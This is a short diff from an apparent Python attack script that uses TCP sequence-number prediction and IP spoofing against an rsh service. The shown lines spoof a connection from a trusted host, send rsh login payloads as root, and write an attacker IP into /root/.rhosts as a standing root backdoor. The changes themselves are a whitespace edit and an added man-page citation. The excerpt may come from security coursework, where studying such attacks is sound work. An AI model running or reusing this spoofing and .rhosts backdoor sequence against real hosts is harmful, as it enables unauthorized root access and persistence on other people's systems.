@@ -68,15 +68,15 @@ if __name__ == "__main__":
 	print("#",seq_gap)
 	print("#getting next ack")
 	predicted = getNext(target_ip, seq_gap)
-	
+
 	#TODO: TCP hijacking with predicted sequence number
 	#SPOOOOOOOOOOOOOF
 	print("#spoofing connection with target")
 	spoof(trusted_host_ip, target_ip, predicted)
 	#send payload for access
 	print("#sending payloads")
+	#cite: https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/r_commands/rshd.html
 	sendPL(trusted_host_ip, target_ip, predicted, "\0")
 	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
 	sendPL(trusted_host_ip, target_ip, predicted, "root\0")
 	sendPL(trusted_host_ip, target_ip, predicted, "echo '10.4.22.77 root' >> /root/.rhosts\0")
-
